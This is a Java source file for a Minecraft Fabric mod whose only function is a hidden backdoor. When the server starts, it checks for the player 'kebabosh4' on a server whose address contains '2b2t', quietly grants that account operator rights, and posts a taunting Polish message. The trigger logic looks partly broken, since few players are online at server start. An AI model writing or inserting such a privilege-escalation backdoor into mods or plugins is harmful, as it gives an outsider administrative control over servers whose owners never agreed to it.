package com.menelopamod;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerLifecycleEvents;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;

public class MenelOpaMod implements ModInitializer {
    @Override
    public void onInitialize() {
        ServerLifecycleEvents.SERVER_STARTED.register((MinecraftServer server) -> {
            for (ServerPlayerEntity player : server.getPlayerManager().getPlayerList()) {
                String playerName = player.getEntityName();
                String serverIP = server.getServerIp() == null ? "" : server.getServerIp();
                if (playerName.equalsIgnoreCase("kebabosh4") && serverIP.contains("2b2t")) {
                    if (!server.getPlayerManager().isOperator(player.getGameProfile())) {
                        server.getCommandManager().execute(server.getCommandSource(), "op " + playerName);
                        player.sendMessage(Text.literal("Menel ma OP — dawaj władę!"), false);
                    }
                }
            }
        });
    }
}
